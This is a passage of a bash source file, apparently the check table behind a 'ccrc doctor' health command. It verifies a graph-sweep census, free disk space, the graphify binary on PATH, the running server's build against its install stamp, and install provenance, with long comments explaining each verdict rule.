    gfx_excludes_warn+=("$gfx_excl_bad of ${#gfx_trees[@]} tree(s) under \$HOME/projects and \$HOME/worktrees do not ignore graphify-out/")
  fi

  # ── (6) census: the sweep's own report on itself ──────────────────────────
  # Six pass-status values exist (`ok`, `probed-zero`, `no-trees-configured`,
  # `pass-locked`, `paused`, `failed` — ccd-graph-sweep's own vocabulary), and
  # TWO of them are hard findings: `probed-zero` is the cap-scopes 13-day
  # failure shape (tree roots existed but the walk touched none of them), and
  # `failed` means the pass could not run at all (no pin, most often) — a
  # DIFFERENT condition from probed-zero but an equally broken one, and
  # doctor must red on both (Ruling R-5).
  # D-1061 (this task): an ABSENT census is deliberately NOT a finding, where
  # the brief's own prose said WARN — `ccrc install` lays the timer down but
  # `OnBootSec=5min` means no fresh box has a census for several minutes at
  # minimum, so a literal WARN here fired on EVERY install, always,
  # everywhere (measured: `ccrc-install.test.ts`'s "ends with doctor, and a
  # box that passes every check exits 0" — the operator ruling behind that
  # test, D-139, is "A FRESH INSTALL ENDS GREEN": a warning that cannot be
  # made to go away by fixing anything is exactly the desensitising yellow
  # that ruling exists to prevent). `_check_build`'s own SKIP-for-"no stamp
  # yet, a deploy writes one" arm is the same shape — but SKIP is a WHOLE-CHECK
  # verdict (`_dr_skip`'s contract: no other verdict line, return 3), and this
  # check has plenty else to measure on the very same box, so the absent case
  # is silence, not a downgrade to SKIP. `jq`-absent and does-not-parse stay
  # real WARNs below: those are genuine defects, not "hasn't happened yet".
  if [ ! -f "$census" ]; then
    :
  elif ! command -v jq >/dev/null 2>&1; then
    # The same duplication `_check_build`'s own jq guard accepts (its own
    # comment: "jq is not on PATH" is a real WARN there too) — a box missing
    # jq gets two lines about it, one per check that needs it to read its
    # own subject, and each names its own subject.
    gfx_census_warn+=("jq is not on PATH, so \$HOME/.ccrc/graph-sweep.json could not be read — see the 'jq' check above")
  else
    local status finished
    status="$(jq -r '.passes[-1].status // empty' "$census" 2>/dev/null)"
    finished="$(jq -r '.passes[-1].finished // empty' "$census" 2>/dev/null)"
    case "$status" in
      probed-zero)
        gfx_census_fail+=("the last graph-sweep pass ended $status")
        ;;
      failed)
        # Finding 2 (whole-branch review): the documented rollout is
        # deploy agent-first -> timer enabled -> sweep fires PINLESS (no
        # `ccrc install` has run yet) -> census {status:"failed", pin:""}
        # -> THEN `ccrc install` converges the engine, the pin file, and
        # every skill stamp. A closing doctor run right after that install
        # still reads the pinless failed pass as the last one (the next
        # timer fire, up to 15 minutes later, is what overwrites it) — FAIL
        # here means `ccrc install` exits 1 on a box that just converged,
        # self-healing on its own inside 15 minutes. That specific shape —
        # failed, empty pin recorded, but the pin file now exists — is a
        # WARN naming what happened; every other failed/probed-zero pass
        # (a real pin recorded, or still no pin file) stays FAIL (R-5).
        local pass_pin
        pass_pin="$(jq -r '.passes[-1].pin // empty' "$census" 2>/dev/null)"
        if [ -z "$pass_pin" ] && [ -n "$pin" ]; then
          gfx_census_warn+=("last sweep pass predates engine provisioning — the next timer fire converges")
        else
          gfx_census_fail+=("the last graph-sweep pass ended $status")
        fi
        ;;
      "")
        gfx_census_warn+=("\$HOME/.ccrc/graph-sweep.json does not parse as a census (no readable last pass)")
        ;;
      *)
        # 3x the timer's own interval (deploy/systemd/ccd-graph-sweep.timer,
        # OnUnitActiveSec=15min) — one missed run is ordinary jitter under
        # load, three in a row means the timer itself has stopped firing.
        # The census is rewritten atomically at the end of EVERY pass, so the
        # FILE's mtime is the last pass's finish — measured through the
        # `_plat_mtime` shim rather than parsing the JSON's ISO stamp, because
        # GNU `date -d` has no Darwin arm (`_plat_date_to_epoch` parses cert
        # dates only) and the macos-platform guard forbids the bare call.
        local now_s fin_s
        if [ -n "$finished" ] && now_s="$(date +%s 2>/dev/null)" \
           && fin_s="$(_plat_mtime "$census" 2>/dev/null)"; then
          local age=$(( now_s - fin_s ))
          if [ "$age" -gt 2700 ]; then
            gfx_census_warn+=("the last graph-sweep pass finished $((age / 60)) minutes ago — the timer may not be firing")
          fi
        fi
        ;;
    esac

    # ── D-1454: the ROWS of that pass, not only its status ─────────────────
    # A pass whose status is `ok` can still have left a third of the fleet's
    # trees with no graph: `ok` means the pass RAN, and every per-tree verdict
    # lives in `trees[]`, which nothing here read. MEASURED on the reference
    # fleet 2026-09-04 — 11 of 51 trees `refused-by-guard` and 2 `failed` on
    # every pass, under `PASS graphify: … census ok`. The census is the only
    # record of those rows, NO VERB PRINTS IT (there is no `ccrc graph`
    # anything — grep `cmd_` in `ccd/ccrc`), and the sweep prints to nobody, so
    # this line is the whole of an operator's visibility into it.
    #
    # WARN, NEVER FAIL, and that is a ruling, not a hedge: a refused tree is
    # the corpus guard doing exactly its job (D-1449's own subject), the fix is
    # in the REPOSITORY and not on this box, and a FAIL would red `ccrc doctor`
    # — hence `ccrc install`'s closing gate, D-139 — for a condition no ccrc
    # verb can clear. The two counts share one bucket because they share one
    # remedy (read the rows, then act per-tree); the failed count is named
    # separately because "refused" and "could not build" are different repairs.
    local gfx_refused gfx_rowfail gfx_rowtotal
    gfx_refused="$(jq -r '[.passes[-1].trees[]? | select(.outcome == "refused-by-guard")] | length' "$census" 2>/dev/null)"
    gfx_rowfail="$(jq -r '[.passes[-1].trees[]? | select(.outcome == "failed")] | length' "$census" 2>/dev/null)"
    gfx_rowtotal="$(jq -r '[.passes[-1].trees[]?] | length' "$census" 2>/dev/null)"
    # An unparseable answer is NOT a zero — it is a measurement that failed,
    # and the arms above already own "the census does not parse". Anything but
    # a run of digits is left to them rather than reported here as "0 refused".
    case "$gfx_refused$gfx_rowfail$gfx_rowtotal" in
      ''|*[!0-9]*) ;;
      *)
        if [ "$gfx_refused" -gt 0 ] || [ "$gfx_rowfail" -gt 0 ]; then
          local -a gfx_bits=()
          [ "$gfx_refused" -gt 0 ] && gfx_bits+=("$gfx_refused refused (untracked paths — commit them, ignore them, or name them in \$HOME/.ccrc/graph-noise/<repo>.list)")
          [ "$gfx_rowfail" -gt 0 ] && gfx_bits+=("$gfx_rowfail failed")
          local gfx_rows_txt="" gfx_bit
          for gfx_bit in "${gfx_bits[@]}"; do
            [ -z "$gfx_rows_txt" ] || gfx_rows_txt+=", "
            gfx_rows_txt+="$gfx_bit"
          done
          gfx_rows_warn+=("$gfx_rows_txt — of $gfx_rowtotal tree(s) in the last graph-sweep pass")
        fi
        ;;
    esac
  fi

  # ── (7) D-995: room on the filesystem WORKTREES_ROOT (or PROJECTS_ROOT) is
  # on — `_check_disk`'s exact parse-and-floor idiom (read-based, no awk),
  # over a DIFFERENT root: the corpus and graphify-out/ a build writes land on
  # this filesystem, and a worktrees root is sometimes its own mount, not
  # $HOME's. Neither root existing is not a finding — a fresh box has neither
  # yet, and (6)'s absent-census arm treats that the same way (D-1061).
  local groot="" gwhich=""
  if [ -d "$wroot" ]; then groot="$wroot"; gwhich="worktrees"
  elif [ -d "$proot" ]; then groot="$proot"; gwhich="projects"
  fi
  # ROOT ABSENT vs ROOT PRESENT-BUT-UNMEASURABLE are two different facts, and
  # collapsing them was the overloaded-null defect review found (Important,
  # this task's fix round): "$groot" empty is legitimately silent (nothing
  # here for the sweep to have written to yet — a fresh box, same as (6)'s
  # absent-census arm), but a SELECTED root that df cannot read (missing df,
  # or a stale/dead mount answering nothing parseable — `_check_disk`'s own
  # comment names exactly this shape) is a measurement that FAILED, not one
  # that was never attempted, and must say so. `_check_disk` WARNs on this
  # same shape for $HOME; this mirrors its wording, over $groot instead.
  if [ -n "$groot" ]; then
    if ! command -v df >/dev/null 2>&1; then
      gfx_disk_unread_warn+=("df is not on PATH, so free space on $groot was never measured")
    else
      local out line last="" avail=""
      out="$(df -Pk "$groot" 2>/dev/null)"
      while IFS= read -r line; do
        [ -z "$line" ] || last="$line"
      done <<< "$out"
      # shellcheck disable=SC2034  # the three leading fields are read to be dropped
      [ -z "$last" ] || read -r _gfx_df_fs _gfx_df_size _gfx_df_used avail _gfx_df_rest <<< "$last"
      case "$avail" in
        ''|*[!0-9]*)
          gfx_disk_unread_warn+=("df could not read $groot, so free space on it was never measured — a stale or dead mount answers exactly this way")
          ;;
        *)
          local floor=$((2 * 1024 * 1024)) tight=$((10 * 1024 * 1024))
          local mib=$((avail / 1024)) gib=$((avail / 1024 / 1024))
          if [ "$avail" -lt "$floor" ]; then
            gfx_disk_fail+=("only $mib MiB free on \$HOME/$gwhich's filesystem — under the 2 GiB floor")
          elif [ "$avail" -lt "$tight" ]; then
            gfx_disk_warn+=("$gib GiB free on \$HOME/$gwhich's filesystem — getting tight")
          fi
          ;;
      esac
    fi
  fi

  # ── the verdict, one line per bucket that has something to say ───────────
  local rc=0
  if [ "${#gfx_install_fail[@]}" -gt 0 ]; then
    _dr_fail graphify "$(_dr_join "${gfx_install_fail[@]}")$gfx_gate" \
      "run: ccrc install — it provisions the engine venv, stamps the pin, and converges every rostered home's skill"
    rc=1
  fi
  if [ "${#gfx_census_fail[@]}" -gt 0 ]; then
    _dr_fail graphify "$(_dr_join "${gfx_census_fail[@]}")$gfx_gate" \
      "read \$HOME/.ccrc/graph-sweep.log for what the pass hit, and check the timer: systemctl --user status ccd-graph-sweep.timer"
    rc=1
  fi
  if [ "${#gfx_disk_fail[@]}" -gt 0 ]; then
    _dr_fail graphify "$(_dr_join "${gfx_disk_fail[@]}")$gfx_gate" \
      "free space on that filesystem before the next sweep pass — under 2 GiB a graph build fails the same way a ccd clone does"
    rc=1
  fi
  if [ "${#gfx_excludes_warn[@]}" -gt 0 ]; then
    _dr_warn graphify "$(_dr_join "${gfx_excludes_warn[@]}")$gfx_gate" \
      "run: ccrc install — it writes the graphify-out/ exclude into every tree the sweep walks"
    [ "$rc" -eq 1 ] || rc=2
  fi
  if [ "${#gfx_census_warn[@]}" -gt 0 ]; then
    _dr_warn graphify "$(_dr_join "${gfx_census_warn[@]}")$gfx_gate" \
      "check the timer: systemctl --user status ccd-graph-sweep.timer (and journalctl --user -u ccd-graph-sweep.service -n 20)"
    [ "$rc" -eq 1 ] || rc=2
  fi
  if [ "${#gfx_rows_warn[@]}" -gt 0 ]; then
    # Its own bucket and its own remedy: the census WARN above is about the
    # TIMER (is the sweep still firing), and `systemctl status` answers nothing
    # here — these rows are per-repository work. No verb prints the census, so
    # the remedy names the file itself rather than inventing one.
    _dr_warn graphify "$(_dr_join "${gfx_rows_warn[@]}")$gfx_gate" \
      "read the rows — each carries its own reason — in \$HOME/.ccrc/graph-sweep.json (.passes[-1].trees[]); a refused tree keeps its last graph and builds again as soon as its corpus is clean"
    [ "$rc" -eq 1 ] || rc=2
  fi
  if [ "${#gfx_disk_warn[@]}" -gt 0 ]; then
    _dr_warn graphify "$(_dr_join "${gfx_disk_warn[@]}")$gfx_gate" \
      "clear room on that filesystem while it is still cheap"
    [ "$rc" -eq 1 ] || rc=2
  fi
  if [ "${#gfx_disk_unread_warn[@]}" -gt 0 ]; then
    # Its own bucket, its own remedy: "clear room" (the bucket above) fixes
    # nothing here — this is "the measurement could not be taken at all",
    # `_check_disk`'s own remedy wording for the identical shape, adapted.
    _dr_warn graphify "$(_dr_join "${gfx_disk_unread_warn[@]}")$gfx_gate" \
      "check by hand: df -Pk <the root named above> — a filesystem df cannot stat answers exactly this way; install df first if it is not on PATH (coreutils on a GNU box, util-linux on some minimal images)"
    [ "$rc" -eq 1 ] || rc=2
  fi
  if [ "$rc" -ne 0 ]; then
    return "$rc"
  fi
  _dr_pass graphify "engine $pin, skills converged, census ok$gfx_gate"
}

# ── graphify-path: what a session runs when it types `graphify` (R3) ──────
# ITS OWN CHECK, not a bucket inside `graphify`, for this file's own stated
# reason: a condition whose fix is a DIFFERENT verb gets its own bucket and its
# own line, and this one's remedy is neither `ccrc install` alone nor anything
# the sweep can do. A FAIL rather than a WARN, because the failure mode is
# silent: the wrong build answers, and its answers look exactly like the right
# build's. Measured on the reference fleet — `~/.local/bin/graphify` was a pip
# console-script shim importing a July copy with no dist-info and no
# `__version__`, while every graph on the box was built by the pinned 0.9.9 venv.
#
# The hyphen in the name is deliberate and legal: `cmd_doctor` calls
# `"_check_$name"` and counts verdict lines matching `"PASS $name: "`, so the
# printed id and the table entry must be the same string, and bash permits a
# hyphen in a function name defined this way.
_check_graphify-path() {
  # The server-role SKIP, in `_check_graphify`'s own shape and for its own
  # reason: a server box runs no sessions that would type `graphify`.
  local role=""
  if [ -f "$BOX_ENV_FILE" ] && [ -r "$BOX_ENV_FILE" ] && declare -F _box_env_value >/dev/null 2>&1; then
    role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
  fi
  if [ "$role" = server ]; then
    _dr_skip graphify-path "this box's role is server — no fleet session runs here, so nothing types graphify"
    return 3
  fi

  local engine="$HOME/.ccrc/graphify-venv/bin/graphify"
  local found="" resolved="" want=""
  found="$(command -v graphify 2>/dev/null)"
  if [ -z "$found" ]; then
    _dr_fail graphify-path "nothing on \$PATH answers 'graphify' — the pinned engine at $engine is reachable only by absolute path, so every bare invocation a session makes fails" \
      "run: ccrc install — it links \$HOME/.local/bin/graphify at the pinned venv"
    return 1
  fi
  # `realpath` is explicitly ALLOWED by `macos-platform.test.ts` (so is
  # `readlink -f`), and both sides are resolved with the SAME tool. WHAT THIS
  # ARM MUST NOT DO is fall back to the UNRESOLVED paths when it cannot answer
  # (D-1350): the link path and the engine path are never equal, so a fully
  # CONVERGED box without `realpath` was told `FAIL graphify-path` — the
  # mismatch verdict, on a comparison nobody made, with a remedy (`ccrc
  # install`) that cannot fix a missing coreutils. An adapter may not narrow a
  # distinction it received, and "I could not measure" is not "the wrong engine
  # answers". Unmeasurable is the FOURTH OUTCOME, this file's header: SKIP,
  # `_check_scopes`' own shape for a tool that is not on PATH, no remedy line
  # by contract — the fact goes in the detail. A MISSING ENGINE is a different
  # condition and keeps its FAIL: `-e` measures it directly, so it is never
  # folded into the skip.
  #
  # TWO TOOLS, ONE FAILURE SEMANTICS: the install's own converge
  # (`_inst_graphify_engine` in `ccd/ccrc`) resolves the same pair with
  # `readlink -f` rather than `realpath`, and that is allowed only because both
  # halves answer EMPTY the same way — "unmeasured", never "unequal". There the
  # link is left in place and the step is counted degraded; here the verdict is
  # SKIP. Change one side's empty handling and the other must change with it,
  # or a box neither of them could measure gets two different verdicts.
  resolved="$(realpath "$found" 2>/dev/null)" || resolved=""
  want="$(realpath "$engine" 2>/dev/null)" || want=""
  if [ ! -e "$engine" ]; then
    _dr_fail graphify-path "\$PATH answers 'graphify' with $found, and there is no pinned engine at $engine to compare it against" \
      "run: ccrc install — it builds the pinned venv and links \$HOME/.local/bin/graphify at it"
    return 1
  fi
  if [ -z "$resolved" ] || [ -z "$want" ]; then
    _dr_skip graphify-path "this box has no usable realpath, so the graphify on \$PATH ($found) and the pinned engine at $engine cannot be resolved to the files they name and compared — coreutils' realpath is what this check measures with"
    return 3
  fi
  if [ "$resolved" = "$want" ]; then
    _dr_pass graphify-path "graphify resolves to $found -> the pinned venv engine"
    return 0
  fi
  _dr_fail graphify-path "\$PATH resolves graphify to $found (-> $resolved), which is not the pinned engine at $engine — a session that types graphify runs a build this box does not pin, and its answers are indistinguishable from the right one's" \
    "run: ccrc install — it links \$HOME/.local/bin/graphify at the venv and refuses rather than replacing a launcher it did not write; if $found is one ccrc will not touch, move it aside, or put \$HOME/.local/bin ahead of it on \$PATH"
  return 1
}

# ── the running build against the stamp (stage 4, Task 9 — spec §8) ───────
# `~/.ccrc/build.json` says what is INSTALLED; the server process reports what
# it BOOTED with, on `GET /health` — the same stamp, read at startup and held
# in memory. Between an install/update and a restart the two legitimately
# differ, and until this check existed nothing on the box said so: `ccrc
# install` replaces the tree and stamps it, doctor read only the stamp, and a
# server still running last week's build passed every check while `install:
# service:` was the one transcript line that knew. FAIL's remedy is the restart
# because that IS the repair — the bits are already on disk.
#
# THE ADDRESS IS `_box_server_addr`'s ANSWER, the same one the fleet check
# asks, because it is the box's ONE statement of where its server listens
# (CCRC_ADDR, or ccrc.env's CCRC_HOST/CCRC_PORT — the exact pair
# `ccrc.service` itself reads through `EnvironmentFile=`). A box with no
# address has no server of its own to compare against — the FLEET host's
# ordinary state — and that is a SKIP, not a finding.
#
# UNREACHABLE IS A SKIP HERE, deliberately unlike the fleet check's WARN for
# the same curl failure: the fleet check's subject is a comparison a
# configured server is expected to be up for, while this check's subject is
# the RUNNING process — and "nothing is running" means there is no running
# build to measure, which is `_check_services`' finding to make (it FAILs an
# inactive ccrc.service with its own remedy). Reporting it here too would
# hand one condition two verdicts in two vocabularies.
#
# THE 401 ARM IS D-150's RULE, restated: `GET /health` is EXEMPT from the
# session gate on this build (auth/gate.ts names it — deploy's liveness
# probe), so a gated answer means an older server or something else entirely
# in front of the port — and either way the GATE answered, not the build.
# Classified from this server's own refusal envelope exactly as `_box_health`
# does; a bare 401 (a proxy demanding credentials) stays the generic
# HTTP-error WARN.
#
# NOTHING FROM THE BODY IS EVER PRINTED — `_box_health`'s standing rule. The
# sha the network sent is compared and discarded; every printed sha is the
# LOCAL stamp's, off this box's own disk.
_check_build() {
  # The readers live in `ccrc`, not here — `_check_fleet`'s guard, for
  # `_check_fleet`'s reason: this file is only ever sourced BY ccrc, and a
  # check that assumed so silently would report on a box it never measured.
  if ! declare -F _box_server_addr >/dev/null 2>&1 || ! declare -F _box_build_fields >/dev/null 2>&1; then
    _dr_fail build "ccrc's own readers are not loaded, so the running server was never compared to the stamp" \
      "this is a bug in ccrc, not a fact about your box — _check_build calls _box_server_addr/_box_build_fields from ccrc itself, and this check table was sourced by something that is not ccrc"
    return 1
  fi

  # THIS BOX'S HALF FIRST: no stamp means nothing to compare, whatever is or
  # is not listening — so nothing is asked over the network at all.
  local s_rc=0
  _box_build_fields || s_rc=$?
  case "$s_rc" in
    0) ;;
    3)
      _dr_skip build "this box has no build stamp ($BOX_STAMP_FILE), so there is nothing to compare the running server against — a deploy or an update writes one"
      return 3 ;;
    5)
      _dr_warn build "jq is not on PATH, so this box's build stamp could not be read" \
        "install it first — see the 'jq' check above"
      return 2 ;;
    *)
      _dr_warn build "the build stamp at $BOX_STAMP_FILE cannot be read, so the running server cannot be compared to it" \
        "something wrote garbage where the stampers write facts — 'ccrc version' names the same refusal; a re-deploy or 'ccrc update' restamps the box"
      return 2 ;;
  esac
  local stamped="${BOX_BUILD[0]}"

  local addr_out addr_rc=0
  addr_out="$(_box_server_addr)" || addr_rc=$?
  local -a af=()
  [ -z "$addr_out" ] || mapfile -t af <<< "$addr_out"
  if [ "$addr_rc" -eq 1 ]; then
    _dr_skip build "this box has no server address (no CCRC_ADDR, and no CCRC_HOST/CCRC_PORT in $BOX_ENV_FILE), so it runs no server of its own whose build could disagree with the stamp"
    return 3
  fi
  if [ "$addr_rc" -ne 0 ]; then
    _dr_skip build "this box's server address cannot be used (${af[0]:-$BOX_ENV_FILE}), so no running server was asked what build it is on"
    return 3
  fi
  local addr="${af[0]}"

  if ! command -v curl >/dev/null 2>&1; then
    _dr_warn build "curl is not on PATH, so the server at $addr could not be asked what build it is running" \
      "install it: sudo apt install curl — the fleet host's own swap hook already needs it (deploy/notify.sh)"
    return 2
  fi

  local out rc=0
  out="$(curl -s --max-time "$CCRC_HEALTH_TIMEOUT" -H 'accept: application/json' \
    -w '\n%{http_code}' "http://$addr/health" 2>/dev/null)" || rc=$?
  if [ "$rc" -ne 0 ]; then
    _dr_skip build "no server answered /health at $addr (curl exited $rc), so there is no RUNNING build to compare the stamp against — whether one SHOULD be running is the 'services' check's finding"
    return 3
  fi
  case "$out" in
    *$'\n'*) ;;
    *)
      _dr_warn build "whatever is listening at $addr answered /health with something this check could not read" \
        "check what that address really is — a ccrc server answers /health with its build stamp as JSON"
      return 2 ;;
  esac
  local code="${out##*$'\n'}" body="${out%$'\n'*}"
  if [ "$code" != 200 ]; then
    if [ "$code" = 401 ] \
       && [[ "$body" =~ \"error\"[[:space:]]*:[[:space:]]*\"unauthenticated\" ]] \
       && [[ "$body" =~ \"verdict\"[[:space:]]*:[[:space:]]*\" ]]; then
      _dr_skip build "the session gate answered /health at $addr, not the build (D-150) — GET /health is exempt on this build, so whatever refused it predates the exemption or sits in front of the port; either way the running build was not measured, and 'ccrc version' still names what is installed"
      return 3
    fi
    local why
    case "$code" in
      [0-9][0-9][0-9]) why="HTTP $code" ;;
      *) why="a status this check could not read" ;;
    esac
    _dr_warn build "the server at $addr answered $why when asked for /health, so it never said what build it is running" \
      "read the server's own log: $(_dr_log_hint ccrc.service)"
    return 2
  fi

  command -v node >/dev/null 2>&1 || {
    _dr_warn build "node is not on PATH, so the server's answer could not be parsed" \
      "install Node first — see the 'node' check above"
    return 2
  }
  # `unstamped` is a real answer (`/health` serves `build: null` on a box the
  # deploy never stamped) and it is kept apart from a malformed body: a server
  # SAYING it carries no stamp, on a box whose disk carries one, booted before
  # the stamp existed — the same staleness the sha mismatch means, so it lands
  # in the same FAIL with the same remedy.
  local running
  running="$(CCRC_HEALTH_BODY="$body" node -e '
    let j; try { j = JSON.parse(process.env.CCRC_HEALTH_BODY); } catch (e) { process.exit(3); }
    if (!j || typeof j !== "object" || Array.isArray(j) || j.ok !== true || !("build" in j)) process.exit(3);
    const b = j.build;
    if (b === null) { process.stdout.write("unstamped"); process.exit(0); }
    if (typeof b !== "object" || Array.isArray(b) || typeof b.sha !== "string" || b.sha.length === 0) process.exit(3);
    process.stdout.write(b.sha);
  ' 2>/dev/null)" || {
    _dr_warn build "whatever answered /health at $addr did not answer with the health JSON, so the running build is unknown" \
      "check what that address really is (a reverse proxy or a captive portal answers exactly this way), and that CCRC_HOST/CCRC_PORT name this box's own server"
    return 2
  }
  if [ "$running" = unstamped ]; then
    _dr_fail build "the server at $addr reports NO build stamp while this box's $BOX_STAMP_FILE names ${stamped:0:12} — the running process predates the stamp on disk" \
      "restart it onto the installed build: $(_dr_restart_hint ccrc.service)"
    return 1
  fi
  if [ "$running" = "$stamped" ]; then
    _dr_pass build "the running server at $addr reports the sha the stamp names (${stamped:0:12})"
    return 0
  fi
  _dr_fail build "the running server at $addr reports a DIFFERENT sha than $BOX_STAMP_FILE (${stamped:0:12} is installed) — the process is still on the build it booted with" \
    "restart it onto the installed build: $(_dr_restart_hint ccrc.service)"
  return 1
}

# ── provenance: did `ccrc update` verify the tree this box runs? ──────────
# (design 2026-09-20 §11; plan D-3247). Line 2 of the
# completed-install record reads `unsigned` for EVERY install `cmd_update` did
# not verify: `_inst_installed` writes it unless the updater put
# CCRC_UPDATE_VERIFIED=1 in the staged spine's environment, which it does only
# after verify-provenance.mjs accepted the release's bundle (D-3117). So the
# mark means "nobody verified this tree" — a checkout `ccrc install`,
# `install.sh --release` (trust on first use), an update driven by a pre-W1
# ccrc, and `--allow-unsigned` alike; the spec's sentence named only the last.
#
# NEVER A FAIL, BY CONSTRUCTION — this function contains no `_dr_fail` at all,
# and ccrc-doctor.test.ts scans its body for one. An unverified install is a
# fact about consent, not a fault: the box it describes is running, and the
# remedy (the next verified `ccrc update`) is the operator's to choose. That is
# why the constants guard is a WARN here, unlike every other check's guard:
# "this table was sourced by something that is not ccrc" is not a finding this
# check may raise to FAIL either.
#
# UNSIGNED IS A PASS, NOT A WARN — coordinator ruling 2026-09-23, over this
# plan's own text: operator ruling D-139 ("a fresh install ends green") stands,
# and every first install of a box is unsigned by construction (a checkout
# `ccrc install`, `install.sh --release`), so a WARN here would make a real
# fresh install's doctor tail close yellow until the box's first verified
# `ccrc update` — exactly the state D-139 was written to forbid. The sentence
# still names the fact; only the verdict and the exit code move.
#
# FOUR ANSWERS, never folded: no record -> SKIP (no spine completed here, so
# there is no install to describe — a deploy.sh box, or a spine that died);
# a record that is not a readable regular file -> WARN, unmeasured; `unsigned`
# -> PASS (see above); anything else -> PASS. Line 1 is `ccrc version`'s
# subject (complete/incomplete against the stamp) and is not judged here.
_check_provenance() {
  if [ -z "${BOX_INSTALLED_FILE:-}" ]; then
    _dr_warn provenance "ccrc's own completed-install path is not loaded, so how this install was made was not measured" \
      "this is a bug in ccrc, not a fact about your box — _check_provenance reads BOX_INSTALLED_FILE, declared once in ccrc itself, and this check table was sourced by something that is not ccrc"
    return 2
  fi
  if [ ! -e "$BOX_INSTALLED_FILE" ]; then
    _dr_skip provenance "no completed-install record ($BOX_INSTALLED_FILE) — nothing to say about how this install was made"
    return 3
  fi
  # `-f` BEFORE `-r`, and both before any read (D-3025): a directory at this
  # path would make the read below fail in a way that prints no verdict.
  if [ ! -f "$BOX_INSTALLED_FILE" ] || [ ! -r "$BOX_INSTALLED_FILE" ]; then
    _dr_warn provenance "$BOX_INSTALLED_FILE cannot be read, so how this install was made was not measured" \
      "ls -l $BOX_INSTALLED_FILE"
    return 2
  fi
  local rec="" prov=""
  # `|| :`, not `|| prov=""`: a last line with no newline still lands in the
  # variable, and clearing it on read's EOF status would lose it.
  { IFS= read -r rec || :; IFS= read -r prov || :; } < "$BOX_INSTALLED_FILE"
  if [ "$prov" = unsigned ]; then
    # D-3286 (final review, B5): "the next ccrc update verifies" is false on
    # a box already at its target — that run no-ops at `_upd_converged`
    # before the staged spine ever runs, so the mark and this PASS survive
    # unchanged until a newer release ships or the operator types --force.
    # Reworded to match README's own fix for the same sentence; the verdict
    # (PASS, D-139) is unchanged.
    _dr_pass provenance "unsigned — this install was not verified by ccrc update (a checkout install, install.sh's trust-on-first-use, or --allow-unsigned); the next ccrc update that installs a release (a newer one, or --force on this one) verifies it and clears the mark"
    return 0
  fi
  _dr_pass provenance "the completed-install record carries no unsigned mark"
}

# ── the two boxes' matched set ────────────────────────────────────────────
# THE ONE CHECK THAT IS NOT ABOUT THIS BOX. Every check above measures the box
# it runs on; this one asks whether this box and the OTHER one are a matched
# set — same build, same generated roster projection — because until the fleet
# host's stamp crossed the wire (Stage 2b, tasks 2-3) a deploy that landed on
# one box and not the other was invisible. Every symptom of that skew shows up
# as a behaviour and never as a version: a `ccd` verb the server believes
# exists, a hook writing a field the server does not read, a frame field one
# side sends and the other drops.
#
# ── IT ASKS, IT DOES NOT DECIDE ──────────────────────────────────────────
# The SERVER is the only party holding both halves (its own stamp and the fleet
# host's, its own roster digest and the fleet host's), so the comparison lives
# there — `rosterAgreement`/`buildAgreement`, server/src/fleetstate.ts — and
# this check reports what it answers. Re-deriving the comparison here would be
# a second implementation of a decision that already has one, and the two would
# disagree the first time either changed.
#
# ── THREE ANSWERS PER QUESTION, KEPT APART ───────────────────────────────
# Both server-side functions are deliberately THREE-valued and both docstrings
# say why, at length: `'unknown'` means NO EVIDENCE — local mode, an agent older
# than the field, a fleet host that was never stamped — and an operator does
# something about `'skewed'`/`'divergent'` and nothing about `'unknown'`.
# Collapsing unknown into either neighbour is the overloaded-null-at-a-seam
# defect this codebase bans, so:
#     agreed              -> PASS
#     skewed / divergent  -> FAIL, one line per disagreement, own remedy each
#     unknown / not one
#       of the three      -> WARN
#     no server to ask    -> SKIP (see the header's FOURTH OUTCOME)
#     a server that could
#       not be reached    -> WARN. "the server is down" is a different problem
#                            from "the two boxes disagree", and reporting the
#                            first as the second sends an operator to redeploy
#                            a box that is fine.
#
# ── WHY TWO FAIL LINES AND NOT ONE ───────────────────────────────────────
# A skewed build and a divergent roster get a line each because their REMEDIES
# differ: one is "deploy the lagging box", the other is "redeploy both, then
# reconcile two hand-owned JSON files". Joining them hands one finding the
# other's instruction, which is precisely the collapse `_check_wrappers` was
# split for (Task 5 review, Important 1).
#
# ── D-72, AND WHY THE PASS IS WORDED THE WAY IT IS ───────────────────────
# `roster: 'agreed'` means the two boxes would run BYTE-IDENTICAL
# `~/.ccrc/accounts.sh` — the projection `ccd` actually obeys. It does NOT mean
# the two `accounts.json` files agree: `shared/generate.mjs` emits no
# `exec.kind` and no `secretsFile`, so two rosters differing only in a secrets
# file produce the same digest and report `'agreed'` (measured on this plan's
# own Task 6 fix). The PASS therefore claims exactly what was measured, and the
# thing that catches the rest is the `wrappers` check above, run on each box.
#
# WHAT THE DIGEST NOW COVERS, and what it still does not. `pool` IS covered:
# `shared/generate.mjs` emits `_ccrc_pool()` into `accounts.sh` always — an
# empty `case` when nothing is tagged — precisely so a pool disagreement
# between the two boxes changes the bytes and reads as `divergent` here, with
# this check's existing remedy. `hidden` is NOT covered, and joins `exec.kind`
# and `secretsFile` in the same disclosure: the generator emits none of the
# three, so two rosters differing only in a `hidden` flag produce the same
# digest and report `'agreed'`. Expect a TRANSIENT `divergent` during any
# agent-first deploy that adds or changes pools — the roster lane lands on one
# box before the other, the deploy output says so, and it clears when the
# second lane runs.
_check_fleet() {
  # THE READERS LIVE IN `ccrc`, NOT HERE, and that is not an accident of where
  # the code was typed: `ccrc status` makes the same call, and a copy of an
  # HTTP request and a JSON classifier in two files is two answers to one
  # question. This file is only ever sourced BY `ccrc` (its own header, first
  # paragraph), so they are in scope — but a check that assumed so silently
  # would report a healthy fleet on a box where the reader had gone missing.
  if ! declare -F _box_server_addr >/dev/null 2>&1 || ! declare -F _box_health >/dev/null 2>&1; then
    _dr_fail fleet "ccrc's own fleet readers are not loaded, so the two boxes were never compared" \
      "this is a bug in ccrc, not a fact about your box — _check_fleet calls _box_server_addr/_box_health from ccrc itself, and this check table was sourced by something that is not ccrc"
    return 1
  fi

  local addr_out addr_rc=0
  addr_out="$(_box_server_addr)" || addr_rc=$?
  local -a af=()
  [ -z "$addr_out" ] || mapfile -t af <<< "$addr_out"
  if [ "$addr_rc" -eq 1 ]; then
    # THE MEASURED STATE OF THE FLEET HOST: it has ~/.ccrc/agent.env (which
    # configures the agent) and no ccrc.env, so nothing on it knows where the
    # server is. Not a fault, and emphatically not an agreement.
    _dr_skip fleet "this box has no server address (no CCRC_ADDR, and no CCRC_HOST/CCRC_PORT in $BOX_ENV_FILE), so there is no server to ask whether the two boxes are a matched set"
    return 3
  fi
